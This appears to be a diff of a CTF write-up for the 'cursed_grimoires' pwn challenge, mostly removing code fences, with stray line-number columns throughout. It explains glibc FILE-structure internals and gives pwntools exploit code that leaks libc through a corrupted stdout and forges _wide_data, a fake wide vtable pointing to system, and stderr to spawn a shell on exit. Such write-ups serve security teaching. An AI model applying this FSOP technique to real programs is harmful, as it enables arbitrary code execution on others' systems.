@@ -11,36 +11,16 @@
 4
 5
 6
-```
-
-
-
-```
 ╰─❯ checksec cursed_grimoires
  Arch: amd64-64-little
  RELRO: Full RELRO
  Stack: Canary found
  NX: NX enabled
  PIE: PIE enabled
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 ╰─❯ ./libc.so.6
 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
-```
-
-
-
-```
 1
  2
  3
@@ -65,11 +45,6 @@ GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
 22
 23
 24
-```
-
-
-
-```
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 {
  int v3; // [rsp+4h] [rbp-Ch] BYREF
@@ -94,11 +69,6 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
  edit_grimoire();
  }
 }
-```
-
-
-
-```
 1
  2
  3
@@ -111,11 +81,6 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 10
 11
 12
-```
-
-
-
-```
 unsigned __int64 menu()
 {
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
@@ -128,11 +93,6 @@ unsigned __int64 menu()
  puts("3. Finish Grimoire");
  return v1 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 1
  2
  3
@@ -153,11 +113,6 @@ unsigned __int64 menu()
 18
 19
 20
-```
-
-
-
-```
 unsigned __int64 create_grimoire()
 {
  size_t size; // [rsp+0h] [rbp-10h] BYREF
@@ -178,11 +133,6 @@ unsigned __int64 create_grimoire()
  }
  return v2 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 1
  2
  3
@@ -205,11 +155,6 @@ unsigned __int64 create_grimoire()
 20
 21
 22
-```
-
-
-
-```
 unsigned __int64 edit_grimoire()
 {
  char v1; // [rsp+3h] [rbp-Dh]
@@ -232,11 +177,6 @@ unsigned __int64 edit_grimoire()
  }
  return v3 - __readfsqword(0x28u);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -244,11 +184,6 @@ unsigned __int64 edit_grimoire()
 5
 6
 7
-```
-
-
-
-```
 NOTES
  By default, Linux follows an optimistic memory allocation strategy. This means that when malloc() returns non-NULL there is no guarantee that the memory really is available. In case it
  turns out that the system is out of memory, one or more processes will be killed by the OOM killer. For more information, see the description of /proc/sys/vm/overcommit_memory and
@@ -256,11 +191,6 @@ NOTES
 
  Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the
  glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2).
-```
-
-
-
-```
 1
  2
  3
@@ -275,11 +205,6 @@ NOTES
 12
 13
 14
-```
-
-
-
-```
 gef➤ x/gx &GRIMOIRE
 0x55e0067dd030 <GRIMOIRE>: 0x00007f3b78939010
 gef➤ vmmap
@@ -294,11 +219,6 @@ Start End Offset Perm Path
 0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap]
 0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw-
 0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
-```
-
-
-
-```
 1
  2
  3
@@ -313,11 +233,6 @@ Start End Offset Perm Path
 12
 13
 14
-```
-
-
-
-```
 gef➤ x/gx &GRIMOIRE
 0x555555558030 <GRIMOIRE>: 0x00007ffff7c9c010
 gef➤ vmmap
@@ -332,11 +247,6 @@ Start End Offset Perm Path
 0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap]
 0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw-
 0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
-```
-
-
-
-```
 1
  2
  3
@@ -356,11 +266,6 @@ Start End Offset Perm Path
 17
 18
 19
-```
-
-
-
-```
 int
 _IO_puts (const char *str)
 {
@@ -380,11 +285,6 @@ _IO_puts (const char *str)
 
 weak_alias (_IO_puts, puts)
 libc_hidden_def (_IO_puts)
-```
-
-
-
-```
 1
  2
  3
@@ -411,11 +311,6 @@ libc_hidden_def (_IO_puts)
 24
 25
 26
-```
-
-
-
-```
 gef➤ print _IO_2_1_stdout_
 $4 = {
  file = {
@@ -442,11 +337,6 @@ $5 = {
 ...
  __write = 0x7ffff7e1ef40 <_IO_new_file_write>,
 }
-```
-
-
-
-```
 1
  2
  3
@@ -482,11 +372,6 @@ $5 = {
 33
 34
 35
-```
-
-
-
-```
 size_t
 _IO_new_file_xsputn (FILE *f, const void *data, size_t n)
 {
@@ -522,11 +407,6 @@ _IO_new_file_xsputn (FILE *f, const void *data, size_t n)
 
 }
 libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
-```
-
-
-
-```
 1
  2
  3
@@ -547,11 +427,6 @@ libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
 18
 19
 20
-```
-
-
-
-```
 int
 _IO_new_file_overflow (FILE *f, int ch)
 {
@@ -572,27 +447,12 @@ _IO_new_file_overflow (FILE *f, int ch)
  ...
 }
 libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
  f->_IO_write_ptr - f->_IO_write_base);
-```
-
-
-
-```
 1
  2
  3
@@ -653,11 +513,6 @@ if (ch == EOF)
 58
 59
 60
-```
-
-
-
-```
 int
 _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
 {
@@ -692,7 +547,7 @@ new_do_write (FILE *fp, const char *data, size_t to_do)
 }
 
 ...
-#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
+    #define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
 ...
 
 ssize_t
@@ -718,33 +573,18 @@ _IO_new_file_write (FILE *f, const void *data, ssize_t n)
  f->_offset += n;
  return n;
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 puts(str)
 |_ _IO_new_file_xsputn (stdout, str, len)
  |_ _IO_new_file_overflow (stdout, EOF)
  |_ new_do_write(stdout, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
  |_ _IO_new_file_write(stdout, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
  |_ write(stdout->fileno, stdout->_IO_write_base, stdout->_IO_write_ptr - stdout->_IO_write_base)
-```
-
-
-
-```
 1
 2
 3
@@ -753,11 +593,6 @@ puts(str)
 6
 7
 8
-```
-
-
-
-```
 gef➤ tele 0x7ffff7fae803
 0x00007ffff7fae803│+0x0000: 0xfafa70000000000a ("\n"?)
 0x00007ffff7fae80b│+0x0008: 0xffffff00007ffff7
@@ -766,27 +601,12 @@ gef➤ tele 0x7ffff7fae803+5
 0x00007ffff7fae808│+0x0000: 0x00007ffff7fafa70 → 0x0000000000000000
 0x00007ffff7fae810│+0x0008: 0xffffffffffffffff
 ...
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 _flags & _IO_NO_WRITES == 0
 _flags & _IO_CURRENTLY_PUTTING == 1
 _flags & _IO_IS_APPENDING == 1
-```
-
-
-
-```
 1
  2
  3
@@ -800,11 +620,6 @@ _flags & _IO_IS_APPENDING == 1
 11
 12
 13
-```
-
-
-
-```
 def create(r, size, content):
  r.sendlineafter(b'=> ', b'1')
  r.sendlineafter(b'=> ', str(size).encode())
@@ -818,31 +633,16 @@ def edit(r, offset, val):
 def exit_binary(r):
  r.sendlineafter(b'=> ', b'3')
  r.interactive()
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Create a big chunk, so that our chunk is located on the newly page
 # created by mmap (To be precise, at libc_base-0xf7ff0)
 chunk_size = 1000000
 offset_to_libc = 0xf7ff0
 create(r, chunk_size, b'a'*8)
-```
-
-
-
-```
 1
  2
  3
@@ -857,11 +657,6 @@ create(r, chunk_size, b'a'*8)
 12
 13
 14
-```
-
-
-
-```
 '''
 Leak libc base via stdout
 '''
@@ -876,11 +671,6 @@ flags_offset = 0x0 # stdout->_flags = &stdout + 0x0
 flags = p32(0x1800)
 for i in range(len(flags)):
  edit(r, stdout_offset_from_chunk+flags_offset+i, flags[i])
-```
-
-
-
-```
 1
  2
  3
@@ -896,11 +686,6 @@ for i in range(len(flags)):
 13
 14
 15
-```
-
-
-
-```
 # Overwrite stdout->_IO_write_ptr to be larger than
 write_ptr_offset = 0x28 # stdout->_IO_write_ptr = &stdout + 0x28
 write_ptr_lsb = 0x50 # You can choose any value. I choose 0x50
@@ -916,11 +701,6 @@ log.info(f'Libc base : {hex(libc_base)}')
 libc.address = libc_base
 chunk_addr = libc_base - 0xf7ff0
 log.info(f'Chunk addr : {hex(chunk_addr)}')
-```
-
-
-
-```
 1
  2
  3
@@ -944,11 +724,6 @@ log.info(f'Chunk addr : {hex(chunk_addr)}')
 21
 22
 23
-```
-
-
-
-```
 static inline const struct _IO_jump_t *
 IO_validate_vtable (const struct _IO_jump_t *vtable)
 {
@@ -964,19 +739,14 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
  return vtable;
 }
 
-#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
+    #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
 
-#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
+    #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
 
 # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
 
-#define _IO_JUMPS_FILE_plus(THIS) \
+    #define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
-```
-
-
-
-```
 1
  2
  3
@@ -1001,11 +771,6 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 22
 23
 24
-```
-
-
-
-```
 gef➤ print __GI__IO_wfile_jumps
 $11 = {
  __dummy = 0x0,
@@ -1030,11 +795,6 @@ $11 = {
  __showmanyc = 0x7ffff7e234a0 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7e234b0 <_IO_default_imbue>
 }
-```
-
-
-
-```
 1
  2
  3
@@ -1074,11 +834,6 @@ $11 = {
 37
 38
 39
-```
-
-
-
-```
 wint_t
 _IO_wfile_overflow (FILE *f, wint_t wch)
 {
@@ -1110,19 +865,14 @@ _IO_wdoallocbuf (FILE *fp)
  ...
 }
 
-#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
+    #define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
 
-#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
+    #define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)
 
-#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
+    #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
 
-#define _IO_WIDE_JUMPS(THIS) \
+    #define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
-```
-
-
-
-```
 1
  2
  3
@@ -1137,11 +887,6 @@ _IO_wdoallocbuf (FILE *fp)
 12
 13
 14
-```
-
-
-
-```
 gef➤ print _IO_wide_data_1
 $10 = {
  _IO_read_ptr = 0x0,
@@ -1156,11 +901,6 @@ $10 = {
  _shortbuf = L"",
  _wide_vtable = 0x7ffff7faa0c0 <__GI__IO_wfile_jumps> <- This is the one that we can overwrite with our fake vtable
 }
-```
-
-
-
-```
 1
  2
  3
@@ -1174,11 +914,6 @@ $10 = {
 11
 12
 13
-```
-
-
-
-```
 Assuming that we overwrite the FILE->vtable from _IO_file_jumps to _IO_wfile_jumps. When the binary try to call
 _IO_OVERFLOW (fp, EOF), the chain would be:
 
@@ -1192,53 +927,28 @@ _IO_OVERFLOW (fp, EOF)
  |_ WJUMP0 (__doallocate, fp)
  |_ (_IO_WIDE_JUMPS_FUNC(fp)->__doallocate) (fp)
  |_ (_IO_WIDE_JUMPS(fp)->__doallocate) (fp) <- No Validation #profit :D
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 exit
 |_ _IO_cleanup
  |_ _IO_flush_all_lockp
  Iterate list of available files (stderr->stdout->stdin), and on each iteration it will call:
  |_ _IO_OVERFLOW (fp, EOF)
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 # Setup fake _wide_vtable
 fake_wide_vtable_addr = chunk_addr + 0x100
 fake_wide_vtable_doallocate_offset_from_chunk = (fake_wide_vtable_addr - chunk_addr) + 0x68
 system_addr = libc.symbols['system']
 for i, num in enumerate(p64(system_addr)):
  edit(r, fake_wide_vtable_doallocate_offset_from_chunk+i, num)
-```
-
-
-
-```
 1
  2
  3
@@ -1250,11 +960,6 @@ for i, num in enumerate(p64(system_addr)):
  9
 10
 11
-```
-
-
-
-```
 # Setup fake _wide_data
 fake_wide_data_addr = chunk_addr
 fake_wide_data_IO_write_base_offset_from_chunk = (fake_wide_data_addr - chunk_addr)+0x20
@@ -1266,11 +971,6 @@ for i, num in enumerate(p64(0)): # Set _wide_data->_IO_buf_base_offset to 0
  edit(r, fake_wide_data_IO_buf_base_offset_from_chunk+i, num)
 for i, num in enumerate(p64(fake_wide_vtable_addr)): # Set _wide_data->_wide_vtable to fake_wide_vtable_addr
  edit(r, fake_wide_data_wide_vtable_offset_from_chunk+i, num)
-```
-
-
-
-```
 1
  2
  3
@@ -1281,11 +981,6 @@ for i, num in enumerate(p64(fake_wide_vtable_addr)): # Set _wide_data->_wide_vta
  8
  9
 10
-```
-
-
-
-```
 # Forge stderr
 fake_stderr = FileStructure(0)
 fake_stderr.flags = u64(b' sh\x00\x00\x00\x00')
@@ -1296,25 +991,10 @@ fake_stderr.vtable = libc.symbols['_IO_wfile_jumps']
 fake_stderr_bytes = bytes(fake_stderr)
 for i, num in enumerate(fake_stderr_bytes):
  edit(r, stderr_offset_from_chunk+i, num)
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 # Exit and profit :D
 exit_binary(r)
-```
-
-
-
-```
 1
  2
  3
@@ -1431,11 +1111,6 @@ exit_binary(r)
 114
 115
 116
-```
-
-
-
-```
 from pwn import *
 
 exe = ELF("cursed_grimoires_patched")
